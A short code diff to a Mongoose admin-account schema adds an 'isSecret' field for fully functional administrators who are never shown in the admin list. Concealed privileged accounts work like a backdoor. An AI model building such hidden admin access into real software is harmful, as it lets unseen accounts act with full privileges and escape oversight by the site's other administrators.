@@ -9,6 +9,9 @@ const AdminSchema = new mongoose.Schema({
   // Empty array = unrestricted (full access), matching legacy behaviour.
   permissions: { type: [String], default: [] },
 
+  // Hidden "secret" admin — fully functional but never shown in the admin list
+  isSecret: { type: Boolean, default: false },
+
   // Security fields
   isActive: { type: Boolean, default: true },
   isLocked: { type: Boolean, default: false },
